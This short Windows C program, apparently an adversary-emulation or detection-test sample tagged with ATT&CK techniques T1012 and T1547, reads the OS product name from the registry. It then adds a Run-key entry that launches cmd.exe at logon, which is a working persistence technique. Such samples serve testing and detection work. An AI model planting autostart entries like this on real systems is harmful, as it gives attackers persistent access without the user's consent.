/* Query Registry + Persistence: T1012 + T1547 */
#include <windows.h>

int main(void) {
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[64] = { 0 };
        DWORD sz = sizeof(buf);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)buf, &sz);
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "T1012T1547", 0, REG_SZ, (const BYTE *)"cmd.exe", 8);
        RegCloseKey(hKey);
    }
    return 0;
}
